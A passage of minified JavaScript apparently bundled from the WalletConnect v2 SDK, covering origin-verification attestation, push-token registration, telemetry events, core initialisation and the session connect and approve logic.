                CT(this, "publicKey"),
                CT(this, "fetchPromise"),
                CT(this, "init", (async () => {
                    var e;
                    this.isDevEnv || (this.publicKey = await this.store.getItem(this.storeKey),
                    this.publicKey && (0,
                    Be.toMiliseconds)(null == (e = this.publicKey) ? void 0 : e.expiresAt) < Date.now() && (this.logger.debug("verify v2 public key expired"),
                    await this.removePublicKey()))
                }
                )),
                CT(this, "register", (async e => {
                    if (!Xl() || this.isDevEnv)
                        return;
                    const t = window.location.origin
                      , {id: r, decryptedId: n} = e
                      , o = "".concat(this.verifyUrlV3, "/attestation?projectId=").concat(this.core.projectId, "&origin=").concat(t, "&id=").concat(r, "&decryptedId=").concat(n);
                    try {
                        const e = (0,
                        Hi.getDocument)()
                          , t = this.startAbortTimer(5 * Be.ONE_SECOND)
                          , n = await new Promise(( (n, i) => {
                            const s = () => {
                                window.removeEventListener("message", c),
                                e.body.removeChild(a),
                                i("attestation aborted")
                            }
                            ;
                            this.abortController.signal.addEventListener("abort", s);
                            const a = e.createElement("iframe");
                            a.src = o,
                            a.style.display = "none",
                            a.addEventListener("error", s, {
                                signal: this.abortController.signal
                            });
                            const c = o => {
                                if (o.data && "string" == typeof o.data)
                                    try {
                                        const i = JSON.parse(o.data);
                                        if ("verify_attestation" === i.type) {
                                            if (xi(i.attestation).payload.id !== r)
                                                return;
                                            clearInterval(t),
                                            e.body.removeChild(a),
                                            this.abortController.signal.removeEventListener("abort", s),
                                            window.removeEventListener("message", c),
                                            n(null === i.attestation ? "" : i.attestation)
                                        }
                                    } catch (i) {
                                        this.logger.warn(i)
                                    }
                            }
                            ;
                            e.body.appendChild(a),
                            window.addEventListener("message", c, {
                                signal: this.abortController.signal
                            })
                        }
                        ));
                        return this.logger.debug("jwt attestation", n),
                        n
                    } catch (ht) {
                        this.logger.warn(ht)
                    }
                    return ""
                }
                )),
                CT(this, "resolve", (async e => {
                    if (this.isDevEnv)
                        return "";
                    const {attestationId: t, hash: r, encryptedId: n} = e;
                    if ("" === t)
                        return void this.logger.debug("resolve: attestationId is empty, skipping");
                    if (t) {
                        if (xi(t).payload.id !== n)
                            return;
                        const e = await this.isValidJwtAttestation(t);
                        if (e)
                            return e.isVerified ? e : void this.logger.warn("resolve: jwt attestation: origin url not verified")
                    }
                    if (!r)
                        return;
                    const o = this.getVerifyUrl(null === e || void 0 === e ? void 0 : e.verifyUrl);
                    return this.fetchAttestation(r, o)
                }
                )),
                CT(this, "fetchAttestation", (async (e, t) => {
                    this.logger.debug("resolving attestation: ".concat(e, " from url: ").concat(t));
                    const r = this.startAbortTimer(5 * Be.ONE_SECOND)
                      , n = await fetch("".concat(t, "/attestation/").concat(e, "?v2Supported=true"), {
                        signal: this.abortController.signal
                    });
                    return clearTimeout(r),
                    200 === n.status ? await n.json() : void 0
                }
                )),
                CT(this, "getVerifyUrl", (e => {
                    let t = e || km;
                    return Nm.includes(t) || (this.logger.info("verify url: ".concat(t, ", not included in trusted list, assigning default: ").concat(km)),
                    t = km),
                    t
                }
                )),
                CT(this, "fetchPublicKey", (async () => {
                    try {
                        this.logger.debug("fetching public key from: ".concat(this.verifyUrlV3));
                        const e = this.startAbortTimer(Be.FIVE_SECONDS)
                          , t = await fetch("".concat(this.verifyUrlV3, "/public-key"), {
                            signal: this.abortController.signal
                        });
                        return clearTimeout(e),
                        await t.json()
                    } catch (_e) {
                        this.logger.warn(_e)
                    }
                }
                )),
                CT(this, "persistPublicKey", (async e => {
                    this.logger.debug("persisting public key to local storage", e),
                    await this.store.setItem(this.storeKey, e),
                    this.publicKey = e
                }
                )),
                CT(this, "removePublicKey", (async () => {
                    this.logger.debug("removing verify v2 public key from storage"),
                    await this.store.removeItem(this.storeKey),
                    this.publicKey = void 0
                }
                )),
                CT(this, "isValidJwtAttestation", (async e => {
                    const t = await this.getPublicKey();
                    try {
                        if (t)
                            return this.validateAttestation(e, t)
                    } catch (Nt) {
                        this.logger.error(Nt),
                        this.logger.warn("error validating attestation")
                    }
                    const r = await this.fetchAndPersistPublicKey();
                    try {
                        if (r)
                            return this.validateAttestation(e, r)
                    } catch (Nt) {
                        this.logger.error(Nt),
                        this.logger.warn("error validating attestation")
                    }
                }
                )),
                CT(this, "getPublicKey", (async () => this.publicKey ? this.publicKey : await this.fetchAndPersistPublicKey())),
                CT(this, "fetchAndPersistPublicKey", (async () => {
                    if (this.fetchPromise)
                        return await this.fetchPromise,
                        this.publicKey;
                    this.fetchPromise = new Promise((async e => {
                        const t = await this.fetchPublicKey();
                        t && (await this.persistPublicKey(t),
                        e(t))
                    }
                    ));
                    const e = await this.fetchPromise;
                    return this.fetchPromise = void 0,
                    e
                }
                )),
                CT(this, "validateAttestation", ( (e, t) => {
                    const r = pg(e, t.publicKey)
                      , n = {
                        hasExpired: (0,
                        Be.toMiliseconds)(r.exp) < Date.now(),
                        payload: r
                    };
                    if (n.hasExpired)
                        throw this.logger.warn("resolve: jwt attestation expired"),
                        new Error("JWT attestation expired");
                    return {
                        origin: n.payload.origin,
                        isScam: n.payload.isScam,
                        isVerified: n.payload.isVerified
                    }
                }
                )),
                this.logger = kt(t, this.name),
                this.abortController = new AbortController,
                this.isDevEnv = vu(),
                this.init()
            }
            get storeKey() {
                return this.storagePrefix + this.version + this.core.customStoragePrefix + "//verify:public:key"
            }
            get context() {
                return Rt(this.logger)
            }
            startAbortTimer(e) {
                return this.abortController = new AbortController,
                setTimeout(( () => this.abortController.abort()), (0,
                Be.toMiliseconds)(e))
            }
        }
        var IT = Object.defineProperty
          , BT = (e, t, r) => ( (e, t, r) => t in e ? IT(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class xT extends Zt {
            constructor(e, t) {
                super(e, t),
                this.projectId = e,
                this.logger = t,
                BT(this, "context", "echo"),
                BT(this, "registerDeviceToken", (async e => {
                    const {clientId: t, token: r, notificationType: n, enableEncrypted: o=!1} = e
                      , i = "".concat("https://echo.walletconnect.com", "/").concat(this.projectId, "/clients");
                    await fetch(i, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            client_id: t,
                            type: n,
                            token: r,
                            always_raw: o
                        })
                    })
                }
                )),
                this.logger = kt(t, this.context)
            }
        }
        var OT = Object.defineProperty
          , _T = Object.getOwnPropertySymbols
          , WT = Object.prototype.hasOwnProperty
          , RT = Object.prototype.propertyIsEnumerable
          , kT = (e, t, r) => t in e ? OT(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , MT = (e, t) => {
            for (var r in t || (t = {}))
                WT.call(t, r) && kT(e, r, t[r]);
            if (_T)
                for (var r of _T(t))
                    RT.call(t, r) && kT(e, r, t[r]);
            return e
        }
          , NT = (e, t, r) => kT(e, "symbol" != typeof t ? t + "" : t, r);
        class FT extends Yt {
            constructor(e, t) {
                let r = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
                super(e, t, r),
                this.core = e,
                this.logger = t,
                NT(this, "context", "event-client"),
                NT(this, "storagePrefix", $y),
                NT(this, "storageVersion", .1),
                NT(this, "events", new Map),
                NT(this, "shouldPersist", !1),
                NT(this, "init", (async () => {
                    if (!vu())
                        try {
                            const e = {
                                eventId: bu(),
                                timestamp: Date.now(),
                                domain: this.getAppDomain(),
                                props: {
                                    event: "INIT",
                                    type: "",
                                    properties: {
                                        client_id: await this.core.crypto.getClientId(),
                                        user_agent: nu(this.core.relayer.protocol, this.core.relayer.version, dm)
                                    }
                                }
                            };
                            await this.sendEvent([e])
                        } catch (_e) {
                            this.logger.warn(_e)
                        }
                }
                )),
                NT(this, "createEvent", (e => {
                    const {event: t="ERROR", type: r="", properties: {topic: n, trace: o}} = e
                      , i = bu()
                      , s = this.core.projectId || ""
                      , a = Date.now()
                      , c = MT({
                        eventId: i,
                        timestamp: a,
                        props: {
                            event: t,
                            type: r,
                            properties: {
                                topic: n,
                                trace: o
                            }
                        },
                        bundleId: s,
                        domain: this.getAppDomain()
                    }, this.setMethods(i));
                    return this.telemetryEnabled && (this.events.set(i, c),
                    this.shouldPersist = !0),
                    c
                }
                )),
                NT(this, "getEvent", (e => {
                    const {eventId: t, topic: r} = e;
                    if (t)
                        return this.events.get(t);
                    const n = Array.from(this.events.values()).find((e => e.props.properties.topic === r));
                    return n ? MT(MT({}, n), this.setMethods(n.eventId)) : void 0
                }
                )),
                NT(this, "deleteEvent", (e => {
                    const {eventId: t} = e;
                    this.events.delete(t),
                    this.shouldPersist = !0
                }
                )),
                NT(this, "setEventListeners", ( () => {
                    this.core.heartbeat.on(We, (async () => {
                        this.shouldPersist && await this.persist(),
                        this.events.forEach((e => {
                            (0,
                            Be.fromMiliseconds)(Date.now()) - (0,
                            Be.fromMiliseconds)(e.timestamp) > 86400 && (this.events.delete(e.eventId),
                            this.shouldPersist = !0)
                        }
                        ))
                    }
                    ))
                }
                )),
                NT(this, "setMethods", (e => ({
                    addTrace: t => this.addTrace(e, t),
                    setError: t => this.setError(e, t)
                }))),
                NT(this, "addTrace", ( (e, t) => {
                    const r = this.events.get(e);
                    r && (r.props.properties.trace.push(t),
                    this.events.set(e, r),
                    this.shouldPersist = !0)
                }
                )),
                NT(this, "setError", ( (e, t) => {
                    const r = this.events.get(e);
                    r && (r.props.type = t,
                    r.timestamp = Date.now(),
                    this.events.set(e, r),
                    this.shouldPersist = !0)
                }
                )),
                NT(this, "persist", (async () => {
                    await this.core.storage.setItem(this.storageKey, Array.from(this.events.values())),
                    this.shouldPersist = !1
                }
                )),
                NT(this, "restore", (async () => {
                    try {
                        const e = await this.core.storage.getItem(this.storageKey) || [];
                        if (!e.length)
                            return;
                        e.forEach((e => {
                            this.events.set(e.eventId, MT(MT({}, e), this.setMethods(e.eventId)))
                        }
                        ))
                    } catch (_e) {
                        this.logger.warn(_e)
                    }
                }
                )),
                NT(this, "submit", (async () => {
                    if (!this.telemetryEnabled || 0 === this.events.size)
                        return;
                    const e = [];
                    for (const [t,r] of this.events)
                        r.props.type && e.push(r);
                    if (0 !== e.length)
                        try {
                            if ((await this.sendEvent(e)).ok)
                                for (const t of e)
                                    this.events.delete(t.eventId),
                                    this.shouldPersist = !0
                        } catch (Oe) {
                            this.logger.warn(Oe)
                        }
                }
                )),
                NT(this, "sendEvent", (async e => {
                    const t = this.getAppDomain() ? "" : "&sp=desktop";
                    return await fetch("".concat("https://pulse.walletconnect.org/batch", "?projectId=").concat(this.core.projectId, "&st=events_sdk&sv=js-").concat(dm).concat(t), {
                        method: "POST",
                        body: JSON.stringify(e)
                    })
                }
                )),
                NT(this, "getAppDomain", ( () => ru().url)),
                this.logger = kt(t, this.context),
                this.telemetryEnabled = r,
                r ? this.restore().then((async () => {
                    await this.submit(),
                    this.setEventListeners()
                }
                )) : this.persist()
            }
            get storageKey() {
                return this.storagePrefix + this.storageVersion + this.core.customStoragePrefix + "//" + this.context
            }
        }
        var UT = Object.defineProperty
          , DT = Object.getOwnPropertySymbols
          , LT = Object.prototype.hasOwnProperty
          , jT = Object.prototype.propertyIsEnumerable
          , zT = (e, t, r) => t in e ? UT(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , VT = (e, t) => {
            for (var r in t || (t = {}))
                LT.call(t, r) && zT(e, r, t[r]);
            if (DT)
                for (var r of DT(t))
                    jT.call(t, r) && zT(e, r, t[r]);
            return e
        }
          , HT = (e, t, r) => zT(e, "symbol" != typeof t ? t + "" : t, r);
        class qT extends Ut {
            constructor(e) {
                var t;
                super(e),
                HT(this, "protocol", "wc"),
                HT(this, "version", 2),
                HT(this, "name", Gy),
                HT(this, "relayUrl"),
                HT(this, "projectId"),
                HT(this, "customStoragePrefix"),
                HT(this, "events", new Se.EventEmitter),
                HT(this, "logger"),
                HT(this, "heartbeat"),
                HT(this, "relayer"),
                HT(this, "crypto"),
                HT(this, "storage"),
                HT(this, "history"),
                HT(this, "expirer"),
                HT(this, "pairing"),
                HT(this, "verify"),
                HT(this, "echoClient"),
                HT(this, "linkModeSupportedApps"),
                HT(this, "eventClient"),
                HT(this, "initialized", !1),
                HT(this, "logChunkController"),
                HT(this, "on", ( (e, t) => this.events.on(e, t))),
                HT(this, "once", ( (e, t) => this.events.once(e, t))),
                HT(this, "off", ( (e, t) => this.events.off(e, t))),
                HT(this, "removeListener", ( (e, t) => this.events.removeListener(e, t))),
                HT(this, "dispatchEnvelope", (e => {
                    let {topic: t, message: r, sessionExists: n} = e;
                    if (!t || !r)
                        return;
                    const o = {
                        topic: t,
                        message: r,
                        publishedAt: Date.now(),
                        transportType: hm.link_mode
                    };
                    this.relayer.onLinkMessageEvent(o, {
                        sessionExists: n
                    })
                }
                ));
                const r = this.getGlobalCore(null === e || void 0 === e ? void 0 : e.customStoragePrefix);
                if (r)
                    try {
                        return this.customStoragePrefix = r.customStoragePrefix,
                        this.logger = r.logger,
                        this.heartbeat = r.heartbeat,
                        this.crypto = r.crypto,
                        this.history = r.history,
                        this.expirer = r.expirer,
                        this.storage = r.storage,
                        this.relayer = r.relayer,
                        this.pairing = r.pairing,
                        this.verify = r.verify,
                        this.echoClient = r.echoClient,
                        this.linkModeSupportedApps = r.linkModeSupportedApps,
                        this.eventClient = r.eventClient,
                        this.initialized = r.initialized,
                        this.logChunkController = r.logChunkController,
                        r
                    } catch (Nt) {
                        console.warn("Failed to copy global core", Nt)
                    }
                this.projectId = null === e || void 0 === e ? void 0 : e.projectId,
                this.relayUrl = (null === e || void 0 === e ? void 0 : e.relayUrl) || Qy,
                this.customStoragePrefix = null != e && e.customStoragePrefix ? ":".concat(e.customStoragePrefix) : "";
                const n = Wt({
                    level: "string" == typeof (null === e || void 0 === e ? void 0 : e.logger) && e.logger ? e.logger : Ky,
                    name: Gy
                })
                  , {logger: o, chunkLoggerController: i} = Mt({
                    opts: n,
                    maxSizeInBytes: null === e || void 0 === e ? void 0 : e.maxLogBlobSizeInBytes,
                    loggerOverride: null === e || void 0 === e ? void 0 : e.logger
                });
                this.logChunkController = i,
                null != (t = this.logChunkController) && t.downloadLogsBlobInBrowser && (window.downloadLogsBlobInBrowser = async () => {
                    var e, t;
                    null != (e = this.logChunkController) && e.downloadLogsBlobInBrowser && (null == (t = this.logChunkController) || t.downloadLogsBlobInBrowser({
                        clientId: await this.crypto.getClientId()
                    }))
                }
                ),
                this.logger = kt(o, this.name),
                this.heartbeat = new Re,
                this.crypto = new lw(this,this.logger,null === e || void 0 === e ? void 0 : e.keychain),
                this.history = new wT(this,this.logger),
                this.expirer = new ET(this,this.logger),
                this.storage = null != e && e.storage ? e.storage : new ht(VT(VT({}, Zy), null === e || void 0 === e ? void 0 : e.storageOptions)),
                this.relayer = new Jw({
                    core: this,
                    logger: this.logger,
                    relayUrl: this.relayUrl,
                    projectId: this.projectId
                }),
                this.pairing = new mT(this,this.logger),
                this.verify = new ST(this,this.logger,this.storage),
                this.echoClient = new xT(this.projectId || "",this.logger),
                this.linkModeSupportedApps = [],
                this.eventClient = new FT(this,this.logger,null === e || void 0 === e ? void 0 : e.telemetryEnabled),
                this.setGlobalCore(this)
            }
            static async init(e) {
                const t = new qT(e);
                await t.initialize();
                const r = await t.crypto.getClientId();
                return await t.storage.setItem("WALLETCONNECT_CLIENT_ID", r),
                t
            }
            get context() {
                return Rt(this.logger)
            }
            async start() {
                this.initialized || await this.initialize()
            }
            async getLogsBlob() {
                var e;
                return null == (e = this.logChunkController) ? void 0 : e.logsToBlob({
                    clientId: await this.crypto.getClientId()
                })
            }
            async addLinkModeSupportedApp(e) {
                this.linkModeSupportedApps.includes(e) || (this.linkModeSupportedApps.push(e),
                await this.storage.setItem(gm, this.linkModeSupportedApps))
            }
            async initialize() {
                this.logger.trace("Initialized");
                try {
                    await this.crypto.init(),
                    await this.history.init(),
                    await this.expirer.init(),
                    await this.relayer.init(),
                    await this.heartbeat.init(),
                    await this.pairing.init(),
                    this.linkModeSupportedApps = await this.storage.getItem(gm) || [],
                    this.initialized = !0,
                    this.logger.info("Core Initialization Success")
                } catch (_l) {
                    throw this.logger.warn("Core Initialization Failure at epoch ".concat(Date.now()), _l),
                    this.logger.error(_l.message),
                    _l
                }
            }
            getGlobalCore() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                try {
                    if (this.isGlobalCoreDisabled())
                        return;
                    const t = "_walletConnectCore_".concat(e)
                      , r = "".concat(t, "_count");
                    return globalThis[r] = (globalThis[r] || 0) + 1,
                    globalThis[r] > 1 && console.warn("WalletConnect Core is already initialized. This is probably a mistake and can lead to unexpected behavior. Init() was called ".concat(globalThis[r], " times.")),
                    globalThis[t]
                } catch (cf) {
                    return void console.warn("Failed to get global WalletConnect core", cf)
                }
            }
            setGlobalCore(e) {
                var t;
                try {
                    if (this.isGlobalCoreDisabled())
                        return;
                    const r = "_walletConnectCore_".concat((null == (t = e.opts) ? void 0 : t.customStoragePrefix) || "");
                    globalThis[r] = e
                } catch (Ot) {
                    console.warn("Failed to set global WalletConnect core", Ot)
                }
            }
            isGlobalCoreDisabled() {
                try {
                    return typeof process < "u" && "true" === {
                        NODE_ENV: "production",
                        PUBLIC_URL: "",
                        WDS_SOCKET_HOST: void 0,
                        WDS_SOCKET_PATH: void 0,
                        WDS_SOCKET_PORT: void 0,
                        FAST_REFRESH: !0
                    }.DISABLE_GLOBAL_CORE
                } catch (e) {
                    return !0
                }
            }
        }
        const GT = qT
          , $T = "client"
          , KT = "".concat("wc", "@").concat(2, ":").concat($T, ":")
          , ZT = $T
          , YT = "error"
          , JT = "WALLETCONNECT_DEEPLINK_CHOICE"
          , XT = "Proposal expired"
          , QT = Be.SEVEN_DAYS
          , eA = {
            wc_sessionPropose: {
                req: {
                    ttl: Be.FIVE_MINUTES,
                    prompt: !0,
                    tag: 1100
                },
                res: {
                    ttl: Be.FIVE_MINUTES,
                    prompt: !1,
                    tag: 1101
                },
                reject: {
                    ttl: Be.FIVE_MINUTES,
                    prompt: !1,
                    tag: 1120
                },
                autoReject: {
                    ttl: Be.FIVE_MINUTES,
                    prompt: !1,
                    tag: 1121
                }
            },
            wc_sessionSettle: {
                req: {
                    ttl: Be.FIVE_MINUTES,
                    prompt: !1,
                    tag: 1102
                },
                res: {
                    ttl: Be.FIVE_MINUTES,
                    prompt: !1,
                    tag: 1103
                }
            },
            wc_sessionUpdate: {
                req: {
                    ttl: Be.ONE_DAY,
                    prompt: !1,
                    tag: 1104
                },
                res: {
                    ttl: Be.ONE_DAY,
                    prompt: !1,
                    tag: 1105
                }
            },
            wc_sessionExtend: {
                req: {
                    ttl: Be.ONE_DAY,
                    prompt: !1,
                    tag: 1106
                },
                res: {
                    ttl: Be.ONE_DAY,
                    prompt: !1,
                    tag: 1107
                }
            },
            wc_sessionRequest: {
                req: {
                    ttl: Be.FIVE_MINUTES,
                    prompt: !0,
                    tag: 1108
                },
                res: {
                    ttl: Be.FIVE_MINUTES,
                    prompt: !1,
                    tag: 1109
                }
            },
            wc_sessionEvent: {
                req: {
                    ttl: Be.FIVE_MINUTES,
                    prompt: !0,
                    tag: 1110
                },
                res: {
                    ttl: Be.FIVE_MINUTES,
                    prompt: !1,
                    tag: 1111
                }
            },
            wc_sessionDelete: {
                req: {
                    ttl: Be.ONE_DAY,
                    prompt: !1,
                    tag: 1112
                },
                res: {
                    ttl: Be.ONE_DAY,
                    prompt: !1,
                    tag: 1113
                }
            },
            wc_sessionPing: {
                req: {
                    ttl: Be.ONE_DAY,
                    prompt: !1,
                    tag: 1114
                },
                res: {
                    ttl: Be.ONE_DAY,
                    prompt: !1,
                    tag: 1115
                }
            },
            wc_sessionAuthenticate: {
                req: {
                    ttl: Be.ONE_HOUR,
                    prompt: !0,
                    tag: 1116
                },
                res: {
                    ttl: Be.ONE_HOUR,
                    prompt: !1,
                    tag: 1117
                },
                reject: {
                    ttl: Be.FIVE_MINUTES,
                    prompt: !1,
                    tag: 1118
                },
                autoReject: {
                    ttl: Be.FIVE_MINUTES,
                    prompt: !1,
                    tag: 1119
                }
            }
        }
          , tA = {
            min: Be.FIVE_MINUTES,
            max: Be.SEVEN_DAYS
        }
          , rA = "IDLE"
          , nA = "ACTIVE"
          , oA = {
            eth_sendTransaction: {
                key: ""
            },
            eth_sendRawTransaction: {
                key: ""
            },
            wallet_sendCalls: {
                key: ""
            },
            solana_signTransaction: {
                key: "signature"
            },
            solana_signAllTransactions: {
                key: "transactions"
            },
            solana_signAndSendTransaction: {
                key: "signature"
            },
            sui_signAndExecuteTransaction: {
                key: "digest"
            },
            sui_signTransaction: {
                key: ""
            },
            hedera_signAndExecuteTransaction: {
                key: "transactionId"
            },
            hedera_executeTransaction: {
                key: "transactionId"
            },
            near_signTransaction: {
                key: ""
            },
            near_signTransactions: {
                key: ""
            },
            tron_signTransaction: {
                key: "txID"
            },
            xrpl_signTransaction: {
                key: ""
            },
            xrpl_signTransactionFor: {
                key: ""
            },
            algo_signTxn: {
                key: ""
            },
            sendTransfer: {
                key: "txid"
            },
            stacks_stxTransfer: {
                key: "txId"
            },
            polkadot_signTransaction: {
                key: ""
            },
            cosmos_signDirect: {
                key: ""
            }
        }
          , iA = ["wc_sessionPropose", "wc_sessionRequest", "wc_authRequest", "wc_sessionAuthenticate"]
          , sA = "".concat("wc", "@", 1.5, ":").concat("auth", ":")
          , aA = "".concat(sA, ":PUB_KEY");
        var cA = Object.defineProperty
          , lA = Object.defineProperties
          , uA = Object.getOwnPropertyDescriptors
          , dA = Object.getOwnPropertySymbols
          , hA = Object.prototype.hasOwnProperty
          , fA = Object.prototype.propertyIsEnumerable
          , pA = (e, t, r) => t in e ? cA(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , gA = (e, t) => {
            for (var r in t || (t = {}))
                hA.call(t, r) && pA(e, r, t[r]);
            if (dA)
                for (var r of dA(t))
                    fA.call(t, r) && pA(e, r, t[r]);
            return e
        }
          , yA = (e, t) => lA(e, uA(t))
          , mA = (e, t, r) => pA(e, "symbol" != typeof t ? t + "" : t, r);
        class bA extends er {
            constructor(e) {
                var t;
                super(e),
                t = this,
                mA(this, "name", "engine"),
                mA(this, "events", new (Ie())),
                mA(this, "initialized", !1),
                mA(this, "requestQueue", {
                    state: rA,
                    queue: []
                }),
                mA(this, "sessionRequestQueue", {
                    state: rA,
                    queue: []
                }),
                mA(this, "requestQueueDelay", Be.ONE_SECOND),
                mA(this, "expectedPairingMethodMap", new Map),
                mA(this, "recentlyDeletedMap", new Map),
                mA(this, "recentlyDeletedLimit", 200),
                mA(this, "relayMessageCache", []),
                mA(this, "pendingSessions", new Map),
                mA(this, "init", (async () => {
                    this.initialized || (await this.cleanup(),
                    this.registerRelayerEvents(),
                    this.registerExpirerEvents(),
                    this.registerPairingEvents(),
                    await this.registerLinkModeListeners(),
                    this.client.core.pairing.register({
                        methods: Object.keys(eA)
                    }),
                    this.initialized = !0,
                    setTimeout((async () => {
                        await this.processPendingMessageEvents(),
                        this.sessionRequestQueue.queue = this.getPendingSessionRequests(),
                        this.processSessionRequestQueue()
                    }
                    ), (0,
                    Be.toMiliseconds)(this.requestQueueDelay)))
                }
                )),
                mA(this, "connect", (async e => {
                    this.isInitialized(),
                    await this.confirmOnlineStateOrThrow();
                    const t = yA(gA({}, e), {
                        requiredNamespaces: e.requiredNamespaces || {},
                        optionalNamespaces: e.optionalNamespaces || {}
                    });
                    await this.isValidConnect(t),
                    t.optionalNamespaces = function(e, t) {
                        var r, n, o, i, s, a;
                        const c = kg(e)
                          , l = kg(t)
                          , u = {}
                          , d = Object.keys(c).concat(Object.keys(l));
                        for (const h of d)
                            u[h] = {
                                chains: gu(null == (r = c[h]) ? void 0 : r.chains, null == (n = l[h]) ? void 0 : n.chains),
                                methods: gu(null == (o = c[h]) ? void 0 : o.methods, null == (i = l[h]) ? void 0 : i.methods),
                                events: gu(null == (s = c[h]) ? void 0 : s.events, null == (a = l[h]) ? void 0 : a.events)
                            };
                        return u
                    }(t.requiredNamespaces, t.optionalNamespaces),
                    t.requiredNamespaces = {};
                    const {pairingTopic: r, requiredNamespaces: n, optionalNamespaces: o, sessionProperties: i, scopedProperties: s, relays: a} = t;
                    let c, l = r, u = !1;
                    try {
                        if (l) {
                            const e = this.client.core.pairing.pairings.get(l);
                            this.client.logger.warn("connect() with existing pairing topic is deprecated and will be removed in the next major release."),
                            u = e.active
                        }
                    } catch (It) {
                        throw this.client.logger.error("connect() -> pairing.get(".concat(l, ") failed")),
                        It
                    }
                    if (!l || !u) {
                        const {topic: e, uri: t} = await this.client.core.pairing.create();
                        l = e,
                        c = t
                    }
                    if (!l) {
                        const {message: e} = Ug("NO_MATCHING_KEY", "connect() pairing topic: ".concat(l));
                        throw new Error(e)
                    }
                    const d = await this.client.core.crypto.generateKeyPair()
                      , h = eA.wc_sessionPropose.req.ttl || Be.FIVE_MINUTES
                      , f = hu(h)
                      , p = yA(gA(gA({
                        requiredNamespaces: n,
                        optionalNamespaces: o,
                        relays: null !== a && void 0 !== a ? a : [{
                            protocol: "irn"
                        }],
                        proposer: {
                            publicKey: d,
                            metadata: this.client.metadata
                        },
                        expiryTimestamp: f,
                        pairingTopic: l
                    }, i && {
                        sessionProperties: i
                    }), s && {
                        scopedProperties: s
                    }), {
                        id: Cy()
                    })
                      , g = pu("session_connect", p.id)
                      , {reject: y, resolve: m, done: b} = cu(h, XT)
                      , v = e => {
                        let {id: t} = e;
                        t === p.id && (this.client.events.off("proposal_expire", v),
                        this.pendingSessions.delete(p.id),
                        this.events.emit(g, {
                            error: {
                                message: XT,
                                code: 0
                            }
                        }))
                    }
                    ;
                    return this.client.events.on("proposal_expire", v),
                    this.events.once(g, (e => {
                        let {error: t, session: r} = e;
                        this.client.events.off("proposal_expire", v),
                        t ? y(t) : r && m(r)
                    }
                    )),
                    await this.sendRequest({
                        topic: l,
                        method: "wc_sessionPropose",
                        params: p,
                        throwOnFailedPublish: !0,
                        clientRpcId: p.id
                    }),
                    await this.setProposal(p.id, p),
                    {
                        uri: c,
                        approval: b
                    }
                }
                )),
                mA(this, "pair", (async e => {
                    this.isInitialized(),
                    await this.confirmOnlineStateOrThrow();
                    try {
                        return await this.client.core.pairing.pair(e)
                    } catch (_l) {
                        throw this.client.logger.error("pair() failed"),
                        _l
                    }
                }
                )),
                mA(this, "approve", (async e => {
                    var t, r, n;
                    const o = this.client.core.eventClient.createEvent({
                        properties: {
                            topic: null == (t = null === e || void 0 === e ? void 0 : e.id) ? void 0 : t.toString(),
                            trace: [Qm]
                        }
                    });
                    try {
                        this.isInitialized(),
                        await this.confirmOnlineStateOrThrow()
                    } catch (E) {
                        throw o.setError(cb),
                        E
                    }
                    try {
                        await this.isValidProposalId(null === e || void 0 === e ? void 0 : e.id)
                    } catch (E) {
                        throw this.client.logger.error("approve() -> proposal.get(".concat(null === e || void 0 === e ? void 0 : e.id, ") failed")),
                        o.setError(pb),
                        E
                    }
                    try {
                        await this.isValidApprove(e)
                    } catch (E) {
                        throw this.client.logger.error("approve() -> isValidApprove() failed"),
                        o.setError(fb),
                        E
                    }
                    const {id: i, relayProtocol: s, namespaces: a, sessionProperties: c, scopedProperties: l, sessionConfig: u} = e
                      , d = this.client.proposal.get(i);
                    this.client.core.eventClient.deleteEvent({
                        eventId: o.eventId
                    });
                    const {pairingTopic: h, proposer: f, requiredNamespaces: p, optionalNamespaces: g} = d;
                    let y = null == (r = this.client.core.eventClient) ? void 0 : r.getEvent({
                        topic: h
                    });
                    y || (y = null == (n = this.client.core.eventClient) ? void 0 : n.createEvent({
                        type: Qm,
                        properties: {
                            topic: h,
                            trace: [Qm, eb]
                        }
                    }));
                    const m = await this.client.core.crypto.generateKeyPair()
                      , b = f.publicKey
                      , v = await this.client.core.crypto.generateSharedKey(m, b)
                      , w = gA(gA(gA({
                        relay: {
                            protocol: null !== s && void 0 !== s ? s : "irn"
                        },
                        namespaces: a,
                        controller: {
                            publicKey: m,
                            metadata: this.client.metadata
                        },
                        expiry: hu(QT)
                    }, c && {
                        sessionProperties: c
                    }), l && {
                        scopedProperties: l
                    }), u && {
                        sessionConfig: u
                    })
                      , T = hm.relay;
                    y.addTrace(tb);
                    try {
                        await this.client.core.relayer.subscribe(v, {
                            transportType: T
                        })
                    } catch (E) {
                        throw y.setError(ub),
                        E
                    }
                    y.addTrace(rb);
                    const A = yA(gA({}, w), {
                        topic: v,
                        requiredNamespaces: p,
                        optionalNamespaces: g,
                        pairingTopic: h,
                        acknowledged: !1,
                        self: w.controller,
                        peer: {
                            publicKey: f.publicKey,
                            metadata: f.metadata
                        },
                        controller: m,
                        transportType: hm.relay
                    });
                    await this.client.session.set(v, A),
                    y.addTrace(ib);
                    try {
                        y.addTrace(sb),
                        await this.sendRequest({
                            topic: v,
                            method: "wc_sessionSettle",
                            params: w,
                            throwOnFailedPublish: !0
                        }).catch((e => {
                            var t;
                            throw null !== (t = y) && void 0 !== t && t.setError(hb),
                            e
                        }
                        )),
                        y.addTrace(ab),
                        y.addTrace(nb),
                        await this.sendResult({
                            id: i,
                            topic: h,
                            result: {
                                relay: {
                                    protocol: null !== s && void 0 !== s ? s : "irn"
                                },
                                responderPublicKey: m
                            },
                            throwOnFailedPublish: !0
                        }).catch((e => {
                            var t;
                            throw null !== (t = y) && void 0 !== t && t.setError(db),
                            e
                        }
                        )),
                        y.addTrace(ob)
                    } catch (E) {
                        throw this.client.logger.error(E),
                        this.client.session.delete(v, Dg("USER_DISCONNECTED")),
                        await this.client.core.relayer.unsubscribe(v),
                        E
                    }
                    return this.client.core.eventClient.deleteEvent({
                        eventId: y.eventId
                    }),
                    await this.client.core.pairing.updateMetadata({
                        topic: h,
